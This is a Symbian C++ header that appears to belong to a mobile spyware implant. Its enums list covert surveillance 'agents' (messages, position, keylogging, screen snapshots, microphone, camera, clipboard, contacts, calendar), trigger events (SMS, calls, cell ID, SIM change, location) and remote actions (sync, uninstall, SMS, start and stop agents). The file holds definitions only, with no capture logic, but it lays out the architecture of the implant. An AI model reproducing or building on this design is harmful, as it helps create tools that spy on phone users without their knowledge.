
#ifndef __CLIENTSERVER_H
#define __CLIENTSERVER_H

#include <e32std.h> 

const TUid KSharedQueueSrvUid3={0x20030634}; 

/**
KPropertyUidSharedQueue
Property reserved for the Shared Queue
*/
const TUid KPropertyUidSharedQueue = KSharedQueueSrvUid3;


/**
KPropertyKeySharedQueueTopAddedOrRemoved
The key to observe changes in the top element of the Shared Queue
Will be updated when there's a new element on the top of the queue
*/
const TUint KPropertyKeySharedQueueTopAddedOrRemoved = 2; 



enum TAgentStatus
	{
	EAgent_Disabled = 1,
	EAgent_Enabled,
	EAgent_Running,
	EAgent_Stopped
	};
		
		
enum TAgentType
	{
	EAgent			= 0x1000,
	EAgent_Messages = 0x1001,				// ***
	EAgent_Tasks_TODO = 0x1002,				
	EAgent_CallList_TODO,				
	EAgent_Device = 0x1004,
	EAgent_Position = 0x1005,				// ***
	EAgent_Call_TODO,
	EAgent_CallLocal_TODO,
	EAgent_Keylog_TODO,
	EAgent_Snapshot = 0x1009,
	EAgent_URL_TODO,
	//EAgent_IM_TODO,
	EAgent_Mic = 0x100D,
	EAgent_Cam_TODO,
	EAgent_Clipboard_TODO,
	EAgent_Crisis_TODO,
	EAgent_Application = 0x1011,
	EAgent_PDA_TODO,	
	EAgent_Addressbook,				// ***
	EAgent_Calendar,				// ***
	EAgent_LAST_ID
	};

enum TEventType
	{
	EEvent			= 0x2000,
	EEvent_Timer,					// ***
	EEvent_Sms,						// ***
	EEvent_Call,
	EEvent_Connection,
	EEvent_Process,
	EEvent_CellID,					// ***
	EEvent_Quota_TODO,
	EEvent_Sim_Change,
	EEvent_Location,				// ***
	EEvent_AC,
	EEvent_Battery,
	EEvent_Standby,
	EEvent_LAST_ID
	};

enum TActionType
	{
	EAction			= 0x4000,
	EAction_Sync,					// ***	
	EAction_Uninstall,
	EAction_Reload,					// ***	
	EAction_Sms,					// ***	
	EAction_Toothing_TODO,
	EAction_StartAgent,				// *** 
	EAction_StopAgent,				// *** 
	EAction_SyncPDA_TODO,
	EAction_Execute_TODO,
	EAction_SyncApn,
	EAction_Log = 0x400B,
	EAction_LAST_ID	
	};

enum TOptionType
	{
	EOption_TODO	= 0x8000,
	EOption_BTGUID_TODO,
	EOption_WiFiMAC_TODO,
	EOption_LAST_ID	
	};


#define ECore 0x9000


enum TCmdType 
	{
	EStart = 1,
	ERestart,
	EStop, 
	ENotify
	};


typedef struct TCmdStruct	
	{
public:
	TCmdType iType;
	TInt iSrc;
	TInt iDest;
	
public:
	inline TCmdStruct() { TCmdStruct(EStart, ECore, ECore); }
	
	inline TCmdStruct(TCmdType aType, TInt aSrc, TInt aDest) 
		{
		iType = aType;
		iSrc = aSrc;
		iDest = aDest;
		}
	} TCommand;


#endif
